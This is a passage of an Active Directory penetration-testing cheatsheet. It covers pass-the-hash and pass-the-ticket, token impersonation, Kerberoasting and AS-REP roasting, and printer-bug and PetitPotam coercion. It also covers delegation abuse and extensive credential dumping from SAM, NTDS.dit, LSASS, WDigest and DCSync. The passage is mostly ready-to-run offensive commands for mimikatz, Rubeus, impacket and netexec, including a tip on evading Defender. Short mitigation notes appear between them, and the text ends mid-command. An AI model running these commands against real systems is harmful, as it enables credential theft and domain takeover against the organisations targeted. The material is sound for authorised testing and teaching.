Find all users and groups that can read LAPS password:

~~~cypher
MATCH p=(m:User)-[:ReadLAPSPassword]->(c:Computer) RETURN p
MATCH p=(m:Group)-[:ReadLAPSPassword]->(c:Computer) RETURN p
~~~

Find all users and groups with SQL admin privileges:

~~~cypher
MATCH p=(m:User)-[:SQLAdmin]->(c:Computer) RETURN p
MATCH p=(m:Group)-[:SQLAdmin]->(c:Computer) RETURN p
~~~

### Hints

- When enumerating users, take a look to `pwdlastset` and `badpwdcount` properties; often, blue teams create **decoy users** which are deliberately made "desirable" for attackers in order to detect them. These users are monitored but can be spotted by looking at those attributes:
	- `pwdlastset` is really old i.e. the password has not been changed for a long time which is really unlikely in a enterprise network configuration.
	- `badpwdcount` is set to 0 i.e. the user has never inserted a wrong password which is really unlikely for a real user
- Quite often cleartext password are store in the `Description` property for a user. This is generally true for those users that are shared, for example, between help desk operators.
- Target for users belonging to **enteprise adminstrators** groups; these groups can be found only on the DC of a forest's root.

### Defense

Hardening can be done on the DC (or other machines) to contain the information provided by the queried machine.

By default, whenever a users performs a domain authentication, it gets assigned with the **Authenticated Users** identity (or security principal) - see [there](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-special-identities-groups#authenticated-users).

- This identity allows access to shared resources within the domain, such as files in a shared folder that should be accessible to all the workers in the organization. Membership is controlled by the operating system.

**Netcease** is a script which changes permissions on the NetSessionEnum
method by removing permission for Authenticated Users group.

- This fails many of the attacker's session enumeration and hence user hunting capabilities.

**SAMRi10** hardens Windows 10 and Server 2016 against enumeration using **SAM Remote (SAMR)** protocol, generally used by `net.exe`.

## Lateral Movements

### Pivoting

**Take also a look to [[network-cheatsheet#Pivoting|Network Cheatsheet - Pivoting]]!**

After opening a socks proxy with impacket's `ntlmrealyx` (`-socks` option), every relayed NTLM hash is made available:

~~~ntlmrelayx
# List releyable credentials
> socks
~~~

It's then possible to use any tool to use these credentials; for Impacket-based tools use the `--no-pass` option. For example:

~~~shell
proxychains secretsdump -no-pass <stored credential - domain/user>@<target>
~~~

### Pass-the-* attacks

- **Pass-the-password**: This attack consists into passing around users credentials (previously obtained, for example, from a SAM dump). 
- **Pass-the-hash**: This attack consists into passing around **local accounts hashes** to check if same credentials for one or more accounts have been used on other machines.
- **Overpass the hash**: When attackers know the RC4 key (which is in fact the user's NT hash), and when the *RC4 etype* is not disabled, they can use it to obtain Kerberos tickets.
- **Pass-the-ticket**/**Pass-the-cache**: This attack consists into passing around Kerberos tickets (TGT or TGS) in order to access services and resources as the compromised user without knowing its credentials. When passing Kerberos form tickets (.kirbi), this technique it's called "Pass-the-ticket"; when passing UNIX-like formatted tickets (.ccache) it's called "Pass-the-cache"
- **Pass-the-key**: This attack consists into using the key derived from user's account password in step *AS_REQ* from Kerberos authentication flow to request a TGT without requiring the actual account's password. Note that **Overpass the hash** is a variant of the **pass-the-key** attack.

Perform a **pass-the-password** attack:

~~~shell
# Deprecated - Use netexec instead
crackmapex <target(s) - CIDR> -u <account username> -p <account password> -d <domain>

# Using netexec
nxc <protocol> <target(s) - CIDR> -u <account username> -p <account password> -d <domain>
~~~

Perform a **pass-the-hash** attack:

~~~shell
# Deprecated - Use netexec instead
crackmapex <target(s) - CIDR> -u <local account username> -H <NTLM hash> --local

# Using netexec
nxc <protocol> <target(s) - CIDR> -u <local account username> -H <NTLM hash> --local-auth

# Using psexec 
psexec.py -hashes <NTLM hash> <domain>/<user>@<target>

# Using xfreerdp
xfreerdp /v:<target> /u:<domain>\\<user> /pth:<NTLM hash>
## Ignore certificates and force sec protocol to RDP
xfreerdp3 /v:<target> /cert:ignore /sec:rdp /size:1180x708


# Using evil-winrm
evil-winrm -i <target> -u <user> -H <NTLM hash>
~~~

**Overpass-the-hash** attack with `mimikatz`:

~~~shell
privilege::debug
sekurlsa::pth /user:<user> /domain:<target domain> /ntlm:<ntlmhash> /run:powershell.exe
~~~

Perform a **pass-the-ticket** attack with `mimikatz`:

~~~shell
kerberos::ptt <path to dumped ticket>
~~~

Perform a pass-the-ticket attack with `Rubeus`:

~~~shell
Rubeus.exe ptt /ticket:<base64 ticker or file path>
~~~

Perform a **pass-the-ticket** attack with `impacket`:

~~~shell
export KRB5CCNAME=<ccache ticket path>
<impacket script> -no-pass -k [script options...]
~~~

Perform a **pass-the-ticket** attack with `NetExec`:

~~~shell
export KRB5CCNAME=<ccache ticket path>
nxc <netexex module> <target> --use-kcache [others module options...]
~~~

**Note**: **when using pass-the-ticket, always use FQDN for targets!!!**

Perform a **pass-the-key** attack with `mimikatz`:

~~~shell
sekurlsa::pth /user:<user> /domain:<target domain> /<key-algorithm>:<key> /run:"<command>"
~~~

where `<key-algorithm>` is one of `rc4`, `aes128` or `aes256`. 

#### Mitigations

- Limit account re-use:
	- Avoid re-using local admin password
	- Disable Guest and Administrator accounts
	- Limit who is a local administrator (least privilege)
- Utilise strong passwords:
	- The longer the better (>14 characters)
	- Avoid using common words
	 - Also long sentences are good
- Privilege Access Management (PAM)
	- Check out/in sensitive accounts when needed
	- Automatically rotate passwords on check out and check in
	- Limits pass attacks as hash/password is strong and constantly rotated

### Token Impersonation 

**Tokens** in Windows are temporary keys that allow you access to a system/network without having to provide credentials each time you access a file, like "cookies" for computers.

There are two type of tokens:

- **Delegation Token**: created when users interactively login into a system using their credentials, also remotely (RDP or VNC). 
- **Impersonation Token**: created when users non-interactively login into a system, like accessing a shared drive on the network.

**Token impersonation** is a Windows post-exploitation technique that allows an attacker to steal the access token of a logged-on user on the system without knowing their credentials and impersonate them to perform operations with their privileges.

- The impersonation technique requires the attacker to gain local admin privileges on the compromised machine to steal its tokens.
- An attacker can obtain **domain admin privileges** if a logged-on user is a **domain administrator**.

#### Token Impersonation: Metasploit

In `metasploit`, load incognito module:

~~~shell
load incognito
~~~

List tokens that is possible to impersonate:

~~~shell
# By username
list_tokens -u

# By Group
list_tokens -g
~~~

Impersonate token:

~~~shell
impersonate_token <user|group>
~~~

\*Note: double the slash to escape the slash.

Revert to starting user:

~~~shell
rev2self
~~~

#### Token Impersonation: Mimikatz

With mimikatz, check current token:

~~~shell
token::whoami
~~~

List token available for being impersonated: 

~~~shell
token::list
~~~

Impersonate token:

~~~
token::elevate /id:<token id>
~~~

Try impersonate **NT AUTHORITY\SYSTEM** account:

~~~
token::elevate
~~~

References:

- [TheHackerRecipes - Mimikatz - Elevate](https://tools.thehacker.recipes/mimikatz/modules/token/elevate)

#### Mitigations

- Mitigation Strategies:
	- Limit user/group token creation permissions
	- Account tiering
	- Local admin restriction

### Kerberoasting

**Kerberoasting** is a common AD attack to obtain Kerberos tickets that help with persistence. In order for this attack to work, the attacker must have access to **SPN**  accounts such as IIS User, MSSQL, etc. 

- The Kerberoasting attack involves requesting a **Ticket Granting Service (TGS)** for a **SPN (Service Principal Name)** using a valid **Ticket Granting Ticket (TGT)** for a compromised domain account.
	- Since the **TGS** is encrypted using the SPN's account hash, it's possible to try cracking it in order to obtain this service account's password.

Note: targeting machine accounts it's useless since those accounts passwords are generally auto-generated and pretty long, being often impossible to crack; instead, targeting service accounts could be successful since those accounts password may be more prone to cracking.

Having `GenericAll` or`GenericWrite` permission a user, allows to forcibly set a SPN for this user and later requesting a TGS in order to brute/force it offline.

- The SPN set can be anything - does not to have sense at all. **It must just be unique in the domain**!

**Targeted Kerberoasting**:  When a user  has a `GenericAll`, `GenericWrite`, `WriteProperty` or `Validated-SPN` over a target user, it's possible to abuse these rights on the target user by making it vulnerable to Kerberoasting.

- This is simply done by adding a temporary SPN, perform a classic Kerberoasting attack  and then remove the SPN.

Find SPN account(s):

~~~powershell
# PowerView
Get-NetUser -SPN

# AD Module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
~~~

Find a SPN  using impacket's `GetUserSPNs` script:

~~~shell
GetUserSPNs.py -dc-ip <DC IP address> <domain/owned user>

# Secify the target domain instead of the DC IP; useful when target domain is different from the user domain (eg. Kerbersoating accross trusts)
GetUserSPNs.py -target-domain <target domain> <domain/owned user> -request 

# Directly request for each found SPN the TGS (so skip next command)
GetUserSPNs.py -dc-ip <DC IP address> <domain/owned user> -request 
~~~

Find Kerberoastable users with `netexec`:

~~~shell
netexec ldap <target> -u <user> -p <password> --kerberoasting kerberoastables.txt
~~~

Request TGS for the specified SPN:

~~~powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<target SPN>"

# or with PowerView
Request-SPNTicket
~~~

Request TGS for the found SPN's user using impacket's `GetUserSPNs`:

~~~shell
python GetUserSPNs.py -dc-ip <DC IP address> <domain/owned user> -request-user <SPN's user>
~~~

Request TGS for all users on which current one as enough privileges using the Targeted Kerberoast technique with [targetedKerberoast.py](https://github.com/ShutdownRepo/targetedKerberoast):

~~~shell
targetedKerberoast.py -d '<domain>' -u '<owned user>' -p '<password>'
~~~


List tickets in memory:

~~~shell
klist
~~~

Export all tickets using Mimikatz:

~~~powershell
Invoke-Mimikatz -Command '"kerberos::list /export"'
~~~

Alternatively, request and dump TGSs for every kerberoastable users (only service accounts):

~~~cmd
Rubeus.exe kerberoast
~~~

Convert kirbi tickets to hashcat/john crackable format with [kirby2john](https://github.com/nidem/kerberoast):

~~~shell
kirby2john <kirbi ticket>
~~~

Convert kirbi tickets to ccache format with Impacket's `ticketConverter`:

~~~shell
ticketConverter.py kirbi_ticket.kirbi ccache_ticket.ccache
~~~

Try cracking the obtained TGS by using hascat:

~~~shell
hashcat -m 13100 <other options> <hash file> <wordlist>
~~~

Force setting a SPN for a user (must be unique in the domain):

~~~powershell
Set-DomainObject -Identity support1user -Set @{serviceprincipalname='<target SPN>'}
~~~

#### Mitigations

- Use strong password for Service Accounts.
- Use Managed Service Accounts which provides automatic password management, simplified service principal name (SPN) management, and the ability to delegate the management to other administrators.

### AS-REP Roasting

This attack it's possible when there's a user account with Kerberos pre-authentication disabled i.e "Do not require Kerberos preauthentication" enabled in UserAccountControl (UAC) settings.

- When pre-authentication is disabled, an attacker can request a ticket for a specific user (*AS-REQ*) without the need to prove its identity to the AS.
- The returned response, the **AS-REP** will contain a part which is encrypted with the requesting user hash (see [[active-directory-cheatsheet#Kerberos Authentication|Kerberos Authentication]]). 
- The **AS-REP Roasting** attack consists into brute-forcing offline this encrypted part in order to obtain the targeted user password.

Having `GenericAll` or `GenericWrite` permission a user, allows to forcibly disable the Kerberos pre-authentication for this user.

Enumerate accounts with Kerberos pre-authentication disabled:

~~~powershell
# Powerview
Get-DomainUser -PreauthNotRequired -Verbose

# AD Module
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
~~~

Enumerate accounts  with Kerberos pre-authentication disabled and dump TGS with Impacket's `GetNPUsers`:

~~~shell
# Without password
impacket-GetNPUsers -no-pass <domain>/<user>
impacket-GetNPUsers -no-pass -usersfile <list of users> <domain>/ 

# With password
GetNPUsers.py -dc-ip <DC ip> <domain>/<user>

GetNPUsers.py -dc-ip <DC ip> -usersfile <list of users> <domain>/ 
~~~

Force disabling Kerberos pre-authentication for a user on which the attacker's controlled user has `GenericAll` or `GenericWrite` permissions:

~~~powershell
Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} -Verbose
~~~

Request TGS for vulnerable users:

~~~cmd
# For every vulnerable user in the current domain
Rubeus.exe asreproast /nowrap

# For a specific user
Rubeus.exe asreproast /user:<target user> /nowrap
~~~

Crack ticket with hashcat:

~~~shell
hashcat -m 18200 <ticket> /usr/share/wordlists/rockyou.txt
~~~

### Dumping Credentials

Mimikatz is a tool used to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. It can also perform pass-the-hash, pass-the-ticket, build Golden tickets, Silver Ticket, etc.

It comes with various modules:

- **sekurlsa**: This module extracts **passwords**, **keys**, **pin codes**, **tickets** from the memory of `lsass` (`Local Security Authority Subsystem Service`)
- **kerberos**: This module can be used without any privilege. It permits to create offline 'Golden tickets' (TGT).
- **lsadump**: This module can be used to dump credentials from LSA\* and SAM database or to decrypt secrets into registry.
- Many others

\*Note: **Local Security Authority (LSA)** is the Windows component responsible for the authentication and privileges management for users accessing to a system resource. It manages credentials such as usernames and passwords and regulates the access to resources such as files, folders, printers, networks, etc.

Every user that has logged to a server has its credentials stored in memory: mimikatz allows to dump these credentials hashes from memory.

- The hashes can be relayed or cracked.

If **WDigest** authentication is enabled, the password will be plaintext stored in memory:

- Until Windows 7, this authentication was enabled by default. From Windows 8 it has been disabled  but it's still present.

An attacker that controls a compromised server could enable the WDigest authentication and then wait for user to logon in order to dump their plaintext password with mimikatz.

Mimikatz exe would be almost certainly blocked by Windows Defender; by using PowerSploit [Invoke-Mimikatz.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1) it's possible to execute mimikatz into memory, helping with bypassing Defender and Real Time Monitoring.

- Invoke-Mimikatz reflectively loads Mimikatz in memory using PowerShell. Can be used for any functionality provided with Mimikatz without writing anything to disk.

It's possible, during enumeration and lateral movement, to encounter some **.keytab** Kerberos files:

- a **keytab** (short for “key table”) stores long-term keys for one or more principals. It's generally used with tools and scripts to authenticate against Kerberos without having to provide credentials each time.
- It's possible to recover from a keytab the NTLM hash of the associated principals.

See [Mimikatz Wiki](https://github.com/gentilkiwi/mimikatz/wiki) and [Mimikatz HackTricks](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz)  for more information about mimikatz usage and capabilities.

Dump credentials and other secrets (cookies, certificates, etc.) remotely with [DonPAPI](https://github.com/login-securite/DonPAPI):

~~~shell
donpapi collect -u <username> -p <password> -d <domain> -t <target>
~~~

Dump credentials and other secrets with `Invoke-Mimikatz`:

~~~powershell
# Dump credentials on a local machine.
Invoke-Mimikatz -DumpCreds

# Dump credentials on multiple remote machines
Invoke-Mimikatz -DumpCreds -ComputerName <computers list> # Uses Invoke-Command
~~~

#### Dumping Credentials - SAM

Exfiltrate SAM and SYSTEM registry hive (needed to decrypt the SAM database) from registries:

~~~shell
reg save HKLM\sam <output path>
reg save HKLM\system <output path>
~~~

Decrypt the SAM database with Impacket's `secretsdump`:

~~~shell
secretsdump -sam sam -system system LOCAL
~~~

Dump SAM database on pwned targets with `NetExec`:

~~~shell
# Deprecated - Use netexec instead
crackmapex <target(s) - CIDR> -u <account username> -p <account password> -d <domain> --sam

# Using netexec
nxc smb <target(s) - CIDR> -u <account username> -p <account password> -d <domain> --sam
~~~

Try dumping SAM database (doesn't always work) with `mimikatz`:

~~~shell
lsadump::sam

# if previous command returned an error try
lsadump::sam /patch
~~~

#### Dumping Credentials - NTDS

Exfiltrate NTDS.dit and SYSTEM and SECURITY (optionally) registry hives (needed to decrypt the NTDS.dit) with `vssadmin`:

~~~shell
# Create shadow copy volume
vssadmin create shadow /for=C:

# Or
wmic shadowcopy call create Volume=C:\


# Copy files from shadow volume
copy <shadow copy name>\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit.save
copy <shadow copy name>\Windows\System32\config\SYSTEM C:\Windows\Temp\system.save
[copy <shadow copy name>\Windows\System32\config\SECURITY C:\Windows\Temp\security.save]

# Delete shadow copy volume
vssadmin delete shadows /shadow=<shadow copy id>
~~~

Note: using cmd instead of PowerShell *might* work better (I've experienced some issues with PS).

xfiltrate NTDS.dit and SYSTEM and SECURITY (optionally) registry hives (needed to decrypt the NTDS.dit) with [Invoke-NinjaCopy.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) (stealthier than `vssadmin`):

~~~powershell
Invoke-NinjaCopy -Path "C:\Windows\NTDS\NTDS.dit" -LocalDestination "C:\Windows\Temp\ntds.dit.save"
Invoke-NinjaCopy -Path "C:\Windows\System32\config\SYSTEM" -LocalDestination "C:\Windows\Temp\system.save"
Invoke-NinjaCopy -Path "C:\Windows\System32\config\SECURITY" -LocalDestination "C:\Windows\Temp\security.save"
~~~

If the "AmbiguousMatchException" is raised, try to patch the `Invoke-NinjaCopy.ps1` script as follows:

- Change the following line (910):   `$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')`
- To: `$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);`

Extract the NTDS.dit and the SYSTEM registry hive with `ntdsutil`:

~~~shell
ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q
~~~

Parse and decrypt NTDS.dit with Impacket's `secretsdump`:

~~~shell
secretsdump -ntds ntds.dit.save -system system.save [-security security.save] LOCAL
~~~

**Note 1**: for large NTDS.dit consider using [gosecretsdump](https://github.com/c-sto/gosecretsdump) (faster).
**Note 2**: having the SECURITY registry hive allows to obtain the machine account NTLM hash. 

Convert NTDS.dit to sqlite database:

~~~shell
# Without SYSTEM registry hive
ntdsdotsqlite ntds.dit.save -o ntds.sqlite

# With SYSTEM registry hive
ntdsdotsqlite ntds.dit.save -o ntds.sqlite --system system.save
~~~

#### Dumping Credentials - LSASS

Dump lsass process from memory (GUI):

1. Open Task Manager
2. Right click on lsass.exe
3. Create dump file

Dump lsass process from memory using ProcDump from SysInternals Suit:

~~~shell
procdump.exe -accepteula -ma lsass.exe <output path>
~~~

Dump lsass with `netexec`:

~~~shell
# Using netexec
nxc smb <target(s) - CIDR> -u <account username> -p <account password> -d <domain> --lsa
~~~

Try dumping credentials from LSA (lsass.exe) process with `mimikatz`:

~~~shell
lsadump::lsa /patch
~~~

#### Dumping Credentials - Secrets

Dump all available credentials with impacket's `secretdump.py` script:

~~~shell
secretdump.py [[domain/]username[:password]@]<targetName or address>
~~~

Dumping secrets from registry hive with mimikatz:

~~~shell
# Must return "Privilege '20' OK" 
privilege::debug
lsadump::secrets
~~~

Dumping credentials with mimikatz:

~~~shell
# Must return "Privilege '20' OK" 
privilege::debug

sekurlsa::logonpasswords
~~~

#### Dumping Credentials - WDigest

Enable WDigest authentication on a compromised server:

~~~shell
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
~~~

Dump Wdigest passwords:

~~~shell
sekurlsa::wdigest
~~~

#### Dumping Credentials - DCSync

A large organization can require multiple Domain Controllers:

- Each domain controller runs a process called the **Knowledge Consistency Checker (KCC)**. 
- The KCC generates a replication topology for the AD forest and automatically connects to other domain controllers through Remote Procedure Calls (RPC) to synchronise information.

The process of replication is called **DC Synchronisation** (or **DC Sync**):

- Domain Admins can perform a DC Sync.

**The attack**: DC Sync can be used to harvest credentials from other DCs.

Dump NTLM hashes with DCSync (Domain Admin privileges required):

~~~shell
lsadump::dcsync
~~~

Dump trust account's hashes (*trust keys*)(Domain Admin privileges required):

~~~shell
lsadump::trust /patch

# or
lsadump::dcsync /user:<trusted domain service account>$
~~~

**Note** - **a user has DCSync privileges when it has the following permissions on  the Domain object**:

- Replicating Directory Changes
- Replicating Directory Changes All
- Replicating Directory Changes In Filtered Set
#### Dumping Credentials - Kerberos Tickets and Keys

Dump Kerberos tickets belonging to all authenticated users on the target server:

~~~shell
# List
sekurlsa::tickets

# Export to file
sekurlsa::tickets /export
~~~

Dump Kerberos encryption keys from memory by using `mimikatz`:

~~~shell
sekurlsa::ekeys
~~~

If previous commands do not work, the current user might not have enough privileges; try to impersonate **NT AUTHORITY\SYSTEM** - see [[active-directory-cheatsheet#Token Impersonation Mimikatz|Token Impersonation with mimikatz]].

Extract TGTs from memory in  a specified time interval with `Rubeus` (requires elevated privileges):

~~~shell
Rubeus.exe monitor /interval:5 /nowrap
Rubeus.exe harvest /interval:30
~~~

Note: `harvest` also automatically renews expiring tickets whilst `monitor` does not.

Dump specific ticket with `Rubeus`:

~~~shell
Rubeus.exe dump /user:<target user> /service:<target service> /nowrap
~~~
#### Dumping Credentials - Windows Credentials Manager

Dump Windows Credentials Manager's passwords from memory with `mimikatz`:

~~~shell
privilege::debug
sekurlsa::credman
~~~

**Take also a look to [[windows-privilege-escalation-cheatsheet#Dumping Credentials|Windows Privilege Escalation - Dumping Credentials]].**

#### Dumping Credentials - Keytab

Extract keys and NTLM hashes with [KeyTabExtract](https://github.com/sosdave/KeyTabExtract):

~~~shell
keytabextract.py <file.keytab>
~~~

For more credentials dumping, take a look at:

- [[active-directory-cheatsheet#Dumping Credentials|Dumping Credentials]]
- [Obtaining Credentials | NetExec](https://www.netexec.wiki/smb-protocol/obtaining-credentials)
- [The Hacker Tools](https://tools.thehacker.recipes/)
#### Dumping Credentials - Linux

On a domain-joined linux machine, under folder `/var/lib/sss/db`, following files can be found:

- Machine ccache ticket.
- `ldb` cache databases containing all tickets used on the system.

Use [ccacheExtractor](https://github.com/Hakumarachi/ccacheExtractor) to extract cached tickets from a `ldb` database:

~~~shell
python3 ccacheExtractor.py kcm <ldb database>
~~~

It's also possible to dump ticket from the keyring  **TODO**.

**Please note that when a domain user authenticates to domain-joined linux machine, its ticket gets also stored by default to** `/tmp`.

Machine account NTLM hash can be extracted from the ketyab file store at `/etc/krb5.keytab`.

### Kerberos Delegation

**Kerberos Delegation** consists into reusing the end-user credentials, **delegating** to a service the ability to act on behalf of this user when accessing services (e.g., web servers) and resources (e.g., databases) hosted elsewhere, without the need for the user to re-authenticate.

- Kerberos delegation is often used in scenarios where multiple services work together, such as in multi-tier applications. For example, a user authenticates to a web server; the web server then makes requests to a database server. The web server may be delegated by the user to access some resources (depending on the type of the delegation) acting as the user itself and not as the web server's service account.

There are three types of Kerberos Delegation:

- **Unconstrained Delegation**
- **Constrained Delegation**
- **Resource-based Constrained Delegation (RBCD)**

Check for delegations with Impacket's `findDelegation`:

~~~shell
impacket-findDelegation <domain>/<username>:<password> -target-domain <target domain>
~~~

#### Unconstrained Delegation

In the **Unconstrained Delegation**, the delegated service can impersonate the user to any service in the domain.

- **The attack**: By compromising the SS1, since the TGT is stored in the LSASS process, it's possible to extract it and reuse it to access services on behalf of the target user. The attacker just needs to wait for this user to connect to the compromised server.

Unconstrained Delegation flow:

1. The user requests a TGS for a particular service server (SS1) after obtaining the TGT from the DC.
2. The user sends to service server (SS1) the TGS (to access the service) and the TGT\* (to be used for delegation) .
3. The service server (SS1) uses the user's TGT to request a new TGS for another service server (SS2).
4. The service server (SS1) uses the new TGS to access the other service server (SS2) resources as the authenticated user.

![[kerberos-unconstrained-delegation.png]]

**\*Note**: the TGT is placed inside the TGS. When the TGS is decrypted, the TGT gets extracted and stored in the LSASS.

Enumerate computers with Unconstrained Delegation Enabled:

~~~powershell
# PowerView
Get-NetComputer -UnConstrained

# AD Module
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}
~~~

See how to dump tickets in memory: [[active-directory-cheatsheet#Dumping Credentials|Dumping Credentials]].

Perform then pass-the-ticket attack with the dumped ticket: [[active-directory-cheatsheet#Pass-the-* attacks|Pass-the-* Attacks]]

##### Coerced Authentications

**MS-RPRN abuse (Printer Bug)**: By abusing Microsoft's Print Spooler service, it's possible for an attacker to force any machine running this service to connect to a target machine. this is done by mean of a particular RPC call (`RpcRemoteFindFirstPrinterChangeNotificationEx`).

- The attacked machine will authenticate to the target machine using its machine account via SMB protocol.

**MS-EFSR abuse (PetitPotam)**: similar to **MS-RPRN**,  this attacks abuses the MS-EFSRPC (Microsoft Encrypting File System Remote Protocol) to coerce authentication from a Windows machine.

- `EfsRpcOpenFileRaw` is the main procedure used to trigger forced authentication.
- Other EFSRPC function like `EfsRpcEncryptFileSrv` or `EfsRpcAddUsersToFile` can also be leveraged.

**Note**: Microsoft has released a patch for PetitPotam (CVE-2021-36942), but only for two of the methods `EfsRpcOpenFileRaw` and `EfsRpcEncryptFileSrv`.

**PrivExchange**: Exchange can be tricked into authenticating to an attacker-controlled machine via NTLM, which can then be relayed to escalate privileges. This is done by simply loggin in on Exchange Web Services and subscribe to push notifications. This will make Exchange connect back to the attacker machine and authenticate as system.

These flaws can be abused in combination with Unconstrained Delegation in order to dump the machine account TGT and use it in a pass-the-ticket attack.

MS-RPRN - Check if spooler service is enabled on remote targets using [SpoolerScanner](https://github.com/vletoux/SpoolerScanner):

~~~powershell
Import-Module .\Get-SpoolStatus.ps1
Get-SpoolStatus <target server>
~~~

MS-RPRN - Check if spooler service is enabled on remote targets using Impacket's `rpcdump`:

~~~shell
rpcdump.py $TARGET | grep MS-RPRN
~~~

MS-RPRN - Trigger spooler service on remote target using [SpoolSample](https://github.com/leechristensen/SpoolSample) or [printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py):

~~~shell
printerbug.py 'DOMAIN'/'USER':'PASSWORD'@'TARGET HOST' 'ATTACKER CONTROLLED HOST'

MS-RPRN.exe <TARGET HOST> <ATTACKER CONTROLLED HOST>
~~~

MS-EFSR - Use the [PetitPotam](https://raw.githubusercontent.com/topotam/PetitPotam/refs/heads/main/PetitPotam.py) exploit (uses only):

~~~shell
Petitpotam.py -d <domain> -u <user> -p <password> <unconstrained delegation host> <target>
~~~

MS-EFSR - Use another [PetitPotam](https://github.com/ly4k/**PetitPotam**) exploit that supports other RPC procedures:

~~~shell
python3 petitpotam.py [-method <method>] <target> '\\<unconstrained delegation host>\share\foo'-debug 
~~~

where `<method>` can be one of:

- `EncryptFileSrv`
- `DecryptFileSrv`
- `QueryUsersOnFile`
- `QueryRecoveryAgents`
- `RemoveUsersFromFile`
- `AddUsersToFile`
- `FileKeyInfo`
- `DuplicateEncryptionInfoFile`
- `AddUsersToFileEx`

Check if a host can be forced to authenticate to another host with [coercer](https://github.com/p0dalirius/Coercer):

~~~shell
coercer scan -u '<user>' -p '<password>' --target <target>
~~~

Force a host to connect to another host with `coercer`:

~~~shell
coercer coerce -u '<user>' -p '<password>' --target <target> --listener-ip  <unconstrained delegation host>
~~~
#### Constrained Delegation

In the **Constrained Delegation**, the service can only impersonate the user to specific services that are explicitly defined, limiting the scope of delegation. 

Even though the user is not using Kerberos Authentication for the SS1, it could be possible to transition the request to Kerberos by the mean of a **Protocol Transition** process.

- **The attack**: By compromising the service account or, even better a machine account. with constrained delegation enabled, it's possible for an attacker to authenticate against allowed services as **any user**!

**Note**: Constrained Delegation only works within the same domain (cannot delegate across domain trusts). Moreover, it needs Domain Admin privileges to be set.

To allow **constrained delegation**, the Kerberos' extensions **Service for User to Proxy (S4U2proxy)** and **Service for User to Self (S4U2self)**, collectively known as Service for User (S4U), were introduced from Windows Server 2012. 

- **Service for User to Self (S4U2self)**: allows a service to obtain a TGS to itself on behalf of a user without the need of supplying any password. The service account must have the `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION – T2A4D UserAccountControl` attribute. This extension allows to perform the **protocol transition**.
- **Service for User to Proxy (S4U2proxy)**: allows a service to obtains a TGS  to another service on behalf of a user. The attribute `msDS-AllowedToDelegateTo` contains a list of SPNs to which TGS can be forwarded.

Constrained delegation flow **without protocol transition** (**Kerberos Only**):

1. The user requests a **forwardable TGS** for a particular service server (SS1) after obtaining the TGT from the DC. A forwardable ticket is provided only when delegation is permitted.
2. The user sends the TGS to service server (SS1) and authenticates to it.
3. The service server (SS1) sends the TGS to the DC to request (**since it is forwadable!**) a new TGS for another service server (SS2)
4. The DC checks the `msDS-AllowedToDelegateTo` on the service server's service account; if the requested service is present in the list, the DC returns a new TGS for the requested service (**S4U2proxy**)
5. The first service server (SS1) send the new ticket to the other service server (SS2) on behalf of the user.

![[kerberos-constrained-delegation-no-protocol-transition.png]]

Constrained delegation flow **with protocol transition**:

1. The user authenticates directly to the service server (SS1) using a non-Kerberos authentication (e.g., NTLM, form-based authentication, basic authentication, etc.).
2. The service server (SS1) requests a TGS to itself to the DC without supplying any password.
3. The DC checks if the service server's service account has the `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` User Access Control (UAC)'s attribute. if everything checks out, the DC returns a TGS (**S4U2Self Ticket**) - **Protocol Transition**.
4. The service server (SS1) passes back the TGS (**S4U2Self Ticket**) to the DC requesting a new TGS for another service server (SS2). The DC checks the `msDS-AllowedToDelegateTo` on the service server's service account; if the requested service is present in the list, the DC returns a new TGS for the requested service (**S4U2proxy**)
5. The first service server (SS1) send the new ticket to the other service server (SS2) on behalf of the user.

![[kerberos-constrained-delegation-with-protocol-transition.png]]

The key concept is that **with protocol transition**, the attacker just needs the target user credentials or hash in order to request a TGT (step 1) that will then be used for the **S4USelf** (steps 2-3) followed by the **S4UProxy** (steps 4-5).

- Abusing S4USelf will therefore allow to impersonate **any user**!

Without protocol transition (**Kerberos Only**) the attacker first **needs a forwardable TGS** of the user he wants to impersonate.

- If the attacker wants to impersonate a different user, he can't use **S4USelf** since it will produce a **non-forwardable TGS**.
- **Resource-Based Constrained Delegation** can be used to obtain a forwardable TGS.
- **CVE-2020-17049** (Bronze bit) can be used to force the `forwardable` flag of a ticket to true.

Enumerate users and computers with Constrained Delegation Enabled:

~~~powershell
# PowerView
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

Get-DomainComputer -TrustedToAuth | select name, msds-allowedtodelegateto, useraccountcontrol | fl
Get-DomainComputer -TrustedToAuth | Select-Object -ExpandProperty msds allowedtodelegateto | fl

# AD Module
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
~~~

Request a TGT:

~~~shell
# Kekeo
tgt::ask /user:<target user> /domain:<target domain> [/password:<password>|/rc4:<rc4 hash>|/aes128:<aes128 hash>|/aes256:<aes256 hash>|/des:<des hash>]

# Rubeus - Request TGT for current user (no elevation required)
Rubeus.exe tgtdeleg 

# Rubeus - Request TGT for specified user
